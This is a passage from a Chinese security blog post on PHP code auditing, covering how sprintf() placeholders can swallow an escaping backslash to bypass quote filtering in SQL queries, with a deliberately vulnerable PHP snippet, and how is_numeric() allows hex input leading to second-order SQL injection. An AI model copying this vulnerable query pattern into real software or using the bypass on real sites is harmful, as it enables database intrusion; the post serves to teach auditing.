<li>mysql_connect() 打开一个到MySQL服务器的链接</li>
<li>sprintf() 将格式化的字符串写入变量中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>

<p><code>arg1</code>、<code>arg2</code>、<code>arg++</code> 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p>
<p>注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成。</p>
<p>可以利用sprintf()绕过一些过滤字符的函数，例如在如下场景中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $name = $_GET[&#x27;name&#x27;];</span><br><span class="line">    $name = mysql_escape_string(stripslashes($name));</span><br><span class="line">    $sql = sprintf(&quot;select * from product where name = &#x27;$name&#x27; and adddate &lt;= &#x27;%s&#x27; limit 1&quot;,date(&quot;Y-m-d H:i:s&quot;));</span><br><span class="line">    echo $sql;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们的单引号被过滤了<br><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png" alt="img"></a></p>
<p>可以利用<code>sprintf()</code>的特性吃掉<code>\</code><br><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png" alt="img"></a></p>
<ul>
<li>urldecode() 解码已编码的URL字符串</li>
<li>rawurldecode() 对已编码的URL字符串进行解码</li>
<li>is_numeric() 判断传入参数是否为字符串</li>
</ul>
<p><code>is_numeric()</code>函数存在插入十六进制字符串到数据库，进而导致SQL二次注入的风险</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/269184.html">https://www.freebuf.com/articles/web/269184.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7834367.html">https://www.cnblogs.com/xiaozi/p/7834367.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7831529.html">https://www.cnblogs.com/xiaozi/p/7831529.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7405">https://xz.aliyun.com/t/7405</a></li>
<li><a target="_blank" rel="noopener" href="https://www.erikten.cn/posts/dcd7a0ad.html">https://www.erikten.cn/posts/dcd7a0ad.html</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5877">https://xz.aliyun.com/t/5877</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1124794084/article/details/104802553">https://blog.csdn.net/qq1124794084/article/details/104802553</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231352.html">https://www.freebuf.com/column/231352.html</a></li>
</ul>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <a class="post-nav-item-left" href="/2023/04/29/%E8%B5%84%E6%BA%90%E7%BB%91%E5%AE%9A/">
      <div class="text-align">
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
        <span class="text-small">上一篇</span>
      </div>
      <div>资源绑定</div>
    </a>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/04/25/jdbc/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      jdbc
    </a>
  
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
            </div>
          
            <div class="foot-line">
              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
            </div>
          
        </div>
        <div class="foot__body">
          
            <div class="foot-item">
              <div class="foot-item__head">朋友</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
                  </div>
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
                  </div>
                
                <div class="text">
                  <img alt="link"
                       height="20px"
                       width="20px"
                       src="/images/icon/icon-link+.svg"/>
                  <a class="foot-link"
                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
                  申请友链</a>
                </div>
              </div>
            </div>
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
                  </div>
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
                    <a class="foot-link" href="">735587142</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
              <div class="text">
                <img alt="link"
                     height="20px"
                     width="20px"
                     src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    
    
  
  
    <script type="text/javascript" src=/js/toc.js></script>
  

  </body>
</html>
